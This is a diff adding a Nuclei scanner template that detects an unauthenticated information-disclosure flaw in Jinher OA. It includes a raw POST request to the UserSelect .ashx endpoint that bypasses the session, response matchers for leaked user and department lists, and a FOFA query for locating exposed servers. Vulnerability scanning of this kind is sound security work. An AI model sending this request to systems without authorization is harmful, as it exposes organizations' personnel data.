@@ -1,0 +1,40 @@
+id: jinher_OA_userwebcontrol_unauthorized
+info:
+  name: 金和OA未授权访问
+  author: Xc1Ym
+  severity: critical
+  description: 金和OA UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx 信息泄露,攻击者可通过此漏洞获取敏感信息。
+  metadata:
+    max-request: 1
+    fofa-query: app="金和网络-金和OA"
+    verified: true
+  tags: unauthorized,OA,jinher,hw
+
+http:
+  - raw:
+      - |-
+        POST /C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx?_method=GetDepartDataByDeptID&_session=no HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: text/plain;charset=UTF-8
+        Connection: close
+
+        strDeptID=
+        strUserId=Admin
+        strUserEsp=
+        strArchivesId=
+        deptIds=
+        IsShowChildrenDept=0
+        IsCascade=1
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body, 'childUsers')
+          - status_code==200
+          - contains(body, 'deptList')
+        condition: and
+# digest: 4b0a00483046022100a5ef7fe1fe0c43eecbb3ddc374bf2122ef4481062eb961149cc27b0a78946415022100fd8152f7dc736991ee7f3ef54eccde111673c9d7f1f18a300c1a0949c39d22cc:6b2dd5af372f02ed15a56faf8ad98cf9
